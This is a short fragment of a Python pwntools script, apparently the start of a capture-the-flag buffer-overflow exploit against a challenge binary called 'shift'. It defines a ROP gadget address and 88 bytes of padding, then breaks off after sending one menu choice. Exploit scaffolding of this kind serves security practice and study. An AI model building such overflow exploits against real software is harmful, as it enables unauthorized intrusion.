#!/usr/bin/env python
from pwn import *

#HOST = 'jh2i.com'
#PORT = 50015
#r = remote(HOST,PORT)
r = process('./shift')

'''GADGET
nop; pop rbp; ret
'''
gadget = p64(0x000000000040124c)
pad = "A" * 88

r.sendline('1')

